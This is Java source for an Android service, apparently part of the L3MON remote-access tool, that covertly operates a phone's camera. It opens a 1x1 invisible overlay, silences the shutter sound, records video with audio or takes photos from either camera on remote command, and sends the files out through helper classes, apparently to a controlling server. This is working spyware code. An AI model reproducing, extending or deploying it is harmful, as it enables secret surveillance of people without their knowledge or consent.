package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class CamService extends Service implements SurfaceHolder.Callback {
    private static final String TAG = "Suprem";
    private static int currentapiVersion = Build.VERSION.SDK_INT;
    private static int typeForAudio = 1;
    private static int typeForVideo = 0;
    private static int typeForImage = 2;
    int buttonNumber = -1;
    private Camera camera = null;
    public String cmd;
    public File file;
    boolean isCameraQualityHigh = false;
    private MediaRecorder mediaRecorder = null;
    private String pathString;
    private int secs = 0;
    private TimerTask stopRecordingTimer;
    private SurfaceView surfaceView;
    private WindowManager windowManager;

    @Override
    public void onCreate() {
    }

    @Override
    public void onDestroy() {
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        Log.d(TAG, "onCreate service");
        this.buttonNumber = intent.getIntExtra("cam", 0);
        if (this.buttonNumber == 1) {
            this.cmd = "RC";
        } else if(this.buttonNumber == 2) {
            this.cmd = "FC";
        } else if(this.buttonNumber == 3) {
            this.cmd = "0xRP";
        } else if(this.buttonNumber == 4) {
            this.cmd = "0xFP";
        } else{
            this.cmd = "RP";
        }
        this.secs = intent.getIntExtra(ConnectionManager.DURATION, 0);
        Log.d(TAG, new StringBuffer().append("onCreate service intent =").append(intent).toString());
        this.windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        this.surfaceView = new SurfaceView(this);
        this.windowManager.addView(this.surfaceView, new WindowManager.LayoutParams(1, 1,
                Build.VERSION.SDK_INT < Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY : WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT));
        this.surfaceView.getHolder().addCallback(this);
        return START_NOT_STICKY;
    }

    @Override
    @SuppressLint("NewApi")
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        if (this.buttonNumber == 1 || this.buttonNumber == 2 || this.buttonNumber == 3 || this.buttonNumber == 4) {
            Log.d(TAG, "surfaceCreated  service");
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                System.out.println(new StringBuffer().append("camera n ").append(i).toString());
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(i, cameraInfo);
                if (this.buttonNumber % 2 == 1 && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    // 后置摄像头
                    Log.d(TAG, new StringBuffer().append("a =").append(this.buttonNumber).toString());
                    this.camera = Camera.open(0);
                    if (currentapiVersion >= 17 && cameraInfo.canDisableShutterSound) {
                        this.camera.enableShutterSound(false);
                    }
                } else if (this.buttonNumber %2 == 0 && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    // 前置摄像头
                    Log.d(TAG, new StringBuffer().append("a =").append(this.buttonNumber).toString());
                    this.camera = Camera.open(1);
                    if (currentapiVersion >= 17 && cameraInfo.canDisableShutterSound) {
                        this.camera.enableShutterSound(false);
                    }
                }
            }
        }
        // 录像设置
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            this.camera.unlock();
            this.mediaRecorder = new MediaRecorder();
            this.mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
            this.mediaRecorder.setCamera(this.camera);
            this.mediaRecorder.setAudioSource(1);
            this.mediaRecorder.setVideoSource(1);
            Log.d(TAG, new StringBuffer().append("Quality isCameraQualityHigh =").append(this.isCameraQualityHigh).toString());
            if (!this.isCameraQualityHigh) {
                this.mediaRecorder.setProfile(CamcorderProfile.get(0));
            } else {
                this.mediaRecorder.setProfile(CamcorderProfile.get(1));
            }
            this.file = getFilePath(typeForVideo, this.buttonNumber);
            this.mediaRecorder.setOutputFile(this.file.getAbsolutePath());
        }
        // 开始录像
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            try {
                this.mediaRecorder.prepare();
            } catch (Exception e) {
            }
            Log.d(TAG, "Recording started ");
            this.mediaRecorder.start();
            this.stopRecordingTimer = new TimerTask() {
                @Override
                public void run() {
                    stopRecording();
                    ScreenRecorderService.sendVideo(cmd, file);
                    stopSelf();
                    Log.e("TAGG", "rec stopeed after sec");
                }
            };
            long intTimerSchedule = this.secs * 1000;
            if(intTimerSchedule == 0) {
                intTimerSchedule = 500;
            }
            new Timer().schedule(this.stopRecordingTimer, intTimerSchedule);
        }
        // 拍照
        if (this.buttonNumber == 3 || this.buttonNumber == 4) {
            try {
//                this.camera.lock();
                this.camera.setPreviewDisplay(surfaceHolder);
                this.camera.startPreview();

                // setting parameters, optional
                Camera.Parameters parameters = camera.getParameters();
                parameters.setPictureFormat(ImageFormat.JPEG);
                List<Camera.Size> sizes = parameters.getSupportedPictureSizes();
                Camera.Size size = sizes.get(0);
                // 获取最小的尺寸
                for(int i = 1; i < sizes.size(); i++){
                    if(sizes.get(i).width < 1080 && sizes.get(i).height < 1080){
                        size = sizes.get(i);
                        break;
                    }
                }
                parameters.setPictureSize(size.width, size.height);
                if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                }
//                List<String> supportedFlashModes = parameters.getSupportedFlashModes();
//                if (supportedFlashModes != null && supportedFlashModes.contains(Camera.Parameters.FLASH_MODE_ON)) {
//                    parameters.setFocusMode(Camera.Parameters.FLASH_MODE_ON);
//                }
                camera.setParameters(parameters);

                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(final byte[] bytes, Camera camera) {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                FileOutputStream fos = null;
                                Bitmap bitmap = null;

                                try {
                                    file = getFilePath(typeForImage, buttonNumber);
                                    fos = new FileOutputStream(file);
                                    fos.write(bytes);
                                    fos.close();

                                    stopRecording();
                                    Screenshot.send(cmd, file);
                                    stopSelf();
                                    Log.d("TAGG", new StringBuffer().append("Got photo?").append(bitmap != null).toString());

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                });

//                new Timer().schedule(new TimerTask() {
//                    @Override
//                    public void run() {
//                        camera.takePicture(null, null, new Camera.PictureCallback() {
//                            @Override
//                            public void onPictureTaken(final byte[] bytes, Camera camera) {
//                                new Thread(new Runnable() {
//                                    @Override
//                                    public void run() {
//                                        FileOutputStream fos = null;
//                                        Bitmap bitmap = null;
//
//                                        try {
//                                            //Convert byte array to bitmap
////                                            bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
//                                            file = getFilePath(typeForImage, buttonNumber);
//                                            fos = new FileOutputStream(file);
//                                            fos.write(bytes);
//                                            fos.close();
////                                          bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);
//
//                                            stopRecording();
//                                            Screenshot.send(cmd, file);
//                                            stopSelf();
//                                            Log.d("TAGG", new StringBuffer().append("Got photo?").append(bitmap != null).toString());
//
//                                        } catch (Exception e) {
//                                            e.printStackTrace();
//                                        }
//                                    }
//                                }).start();
//                            }
//                        });
//                    }
//                }, 100);

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null){
            this.mediaRecorder.stop();
            this.mediaRecorder.reset();
            this.mediaRecorder.release();
        }
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            this.camera.lock();
            this.camera.release();
        } else if(this.buttonNumber == 3 || this.buttonNumber == 4) {
            this.camera.stopPreview();
            this.camera.release();
        }
        this.windowManager.removeView(this.surfaceView);
        Log.d(TAG, "cam stopped ");
        stopSelf();
    }
    public static File getFilePath(int i, int i2) {
        File file = null;
        String mSamplePath = null;
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
        if (Environment.getExternalStorageState().equals("mounted")) {
//            mSamplePath = Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath();
            mSamplePath = MainService.getContextOfApplication().getExternalCacheDir().getPath();
        } else {
            mSamplePath = MainService.getContextOfApplication().getCacheDir().getPath();
        }
        if(i == 0){
            if(i2 == 1){
                file = new File(mSamplePath + "/rear_video_" + simpleDateFormat.format(new Date()) + ".mp4");
            } else {
                file = new File(mSamplePath + "/front_video_" + simpleDateFormat.format(new Date()) + ".mp4");
            }
        }
        if(i == 2) {
            if(i2 % 2 == 1){
                file = new File(mSamplePath + "/rear_photo_" + simpleDateFormat.format(new Date()) + ".png");
            } else {
                file = new File(mSamplePath + "/front_photo_" + simpleDateFormat.format(new Date()) + ".png");
            }
        }
        return file;
    }

    public static File getFilePath2(int i, int i2) {
        File file2 = null;
        if (Environment.getExternalStorageState().equals("mounted")) {
            File file3 = new File(Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath());
            Log.d("TAGG", new StringBuffer().append("path cam ").append(Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath()).toString());
            if (file3.exists()) {
                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm", Locale.getDefault());
                if (i == 0) {
                    if (i2 == 1) {
                        file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("rear_").toString()).append("video_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp4").toString());
                    } else {
                        file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("front_").toString()).append("video_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp4").toString());
                    }
                }
                if (i == 1) {
                    file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("audio_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp3").toString());
                }
                if (i == 2) {
                    file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("screenshot_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".png").toString());
                }
                return file2;
            }
        }
        return null;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}